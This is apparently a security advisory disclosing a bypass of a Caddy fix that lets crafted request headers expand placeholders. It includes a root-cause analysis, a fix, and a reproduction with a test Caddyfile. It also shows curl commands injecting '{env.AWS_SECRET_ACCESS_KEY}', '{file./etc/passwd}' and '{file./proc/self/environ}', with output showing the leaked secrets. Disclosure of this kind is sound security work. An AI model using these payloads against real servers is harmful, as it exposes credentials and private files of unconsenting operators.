# [M] Caddy CVE-2026-30852 Fix Bypass

## Summary
Severity: Medium
Advisory: GHSA-wwhq-w58m-w29c
CWE: CWE-917
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-wwhq-w58m-w29c
Type: github-advisory

## Affected
- Go: `github.com/caddyserver/caddy/v2` — affected >=2.11.0

## Details
# 

## TL;DR

CVE-2026-30852 fixed double expansion in `vars_regexp` when the variable key is a placeholder (e.g. `{http.vars.x}`). The fix does NOT protect literal key names (e.g. `tenant_id`). An attacker injects `{env.AWS_SECRET_ACCESS_KEY}` or `{file./etc/passwd}` via a request header → Caddy expands it on the second pass → secrets leaked in response headers.

**Affected:** Caddy v2.11.0 through v2.11.2 (latest). All versions since the CVE-2026-30852 fix.

## Root Cause

`modules/caddyhttp/vars.go`, lines 215-217:

```go
valExpanded = varStr
if !fromPlaceholder {
    valExpanded = repl.ReplaceAll(varStr, "")  // ← SECOND EXPANSION
}
```

Same issue at line 358-360 in `MatchVarsRE`.

`fromPlaceholder` is `false` when the variable key is a literal string (not wrapped in `{}`). The fix only protects `fromPlaceholder=true`.

### Expansion chain:

1. Config: `vars tenant_id {http.request.header.X-Tenant-ID}`
2. Request header: `X-Tenant-ID: {env.SECRET}`
3. **Pass 1** (`VarsMiddleware.ServeHTTP`, line 63): `repl.ReplaceAll("{http.request.header.X-Tenant-ID}", "")` → resolves to literal string `{env.SECRET}`. Stored in vars map.
4. **Pass 2** (`VarsMatcher.MatchWithError`, line 217): `repl.ReplaceAll("{env.SECRET}", "")` → resolves to the actual secret value.
5. Leaked value reflected in response header `X-Tenant-ID` or forwarded to backend via `reverse_proxy`.

## Impact

- **Environment variable disclosure:** `{env.AWS_SECRET_ACCESS_KEY}`, `{env.DATABASE_URL}`, etc.
- **Arbitrary file read (up to 1MB):** `{file./etc/passwd}`, `{file./proc/self/environ}`
- **System info:** `{system.hostname}`, `{system.os}`
- **Full env dump in one request:** `{file./proc/self/environ}`

## Realistic Attack Scenario

API gateway pattern - Caddy captures a tenant ID header, validates it with `vars_regexp`, and reflects it in response headers or forwards to a backend. This is a common production pattern for multi-tenant routing.

```
# Caddyfile
:8080 {
    vars tenant_id {http.request.header.X-Tenant-ID}
    @has_tenant vars_regexp tenant tenant_id (.+)
    handle @has_tenant {
        header X-Tenant-ID "{re.tenant.1}"
        reverse_proxy tenant-backend:8080
    }
    respond "Missing X-Tenant-ID header" 400
}
```

```
# docker-compose.yml
services:
  caddy:
    image: caddy:2.11.2
    ports:
      - "8080:8080"
    volumes:
      - ./Caddyfile:/etc/caddy/Caddyfile:ro
    environment:
      - SECRET_API_KEY=sk-SUPER-SECRET-KEY-12345
      - DATABASE_URL=postgresql://admin:p4ssw0rd@db.internal:5432/production
      - AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
      - INTERNAL_TOKEN=eyJhbGciOiJIUzI1NiJ9.INTERNAL_ONLY
```

Attacker sends: `X-Tenant-ID: {env.AWS_SECRET_ACCESS_KEY}`
Response contains: `X-Tenant-ID: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`

## Reproduce

```bash
docker compose up -d
sleep 2

# Normal request — works as expected
curl -sI -H "X-Tenant-ID: acme-corp" http://localhost:8080/ | grep X-Tenant
# X-Tenant-Id: acme-corp

# Leak env var via response header
curl -sI -H "X-Tenant-ID: {env.SECRET_API_KEY}" http://localhost:8080/ | grep X-Tenant
# X-Tenant-Id: sk-SUPER-SECRET-KEY-12345

# Leak AWS credentials
curl -sI -H "X-Tenant-ID: {env.AWS_SECRET_ACCESS_KEY}" http://localhost:8080/ | grep X-Tenant
# X-Tenant-Id: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Read arbitrary file
curl -sI -H "X-Tenant-ID: {file./etc/passwd}" http://localhost:8080/ | grep X-Tenant

# Dump ALL env vars (Linux)
curl -s -H "X-Tenant-ID: {file./proc/self/environ}" http://localhost:8080/
```

## Confirmed Test Output (Caddy v2.11.2)

```
$ curl -sI -H "X-Tenant-ID: acme-corp" http://localhost:8080/ | grep -i x-tenant
X-Tenant-Id: acme-corp
X-Routed-To: tenant-acme-corp

$ curl -sI -H "X-Tenant-ID: {env.SECRET_API_KEY}" http://localhost:8080/ | grep -i x-tenant
X-Tenant-Id: sk-SUPER-SECRET-KEY-12345
X-Routed-To: tenant-sk-SUPER-SECRET-KEY-12345

$ curl -sI -H "X-Tenant-ID: {env.AWS_SECRET_ACCESS_KEY}" http://localhost:8080/ | grep -i x-tenant
X-Tenant-Id: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
X-Routed-To: tenant-wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

$ curl -sI -H "X-Tenant-ID: {file./etc/hostname}" http://localhost:8080/ | grep -i x-tenant
X-Tenant-Id: 06140d4a8645
```

## Fix

Apply expansion guard to BOTH branches:

```go
// vars.go line 215-217 — fix:
valExpanded = varStr
// REMOVE: if !fromPlaceholder {
//     valExpanded = repl.ReplaceAll(varStr, "")
// }
```

Or sanitize vars stored from user input before re-expansion.

## References
- https://github.com/caddyserver/caddy/security/advisories/GHSA-wwhq-w58m-w29c
- https://github.com/caddyserver/caddy
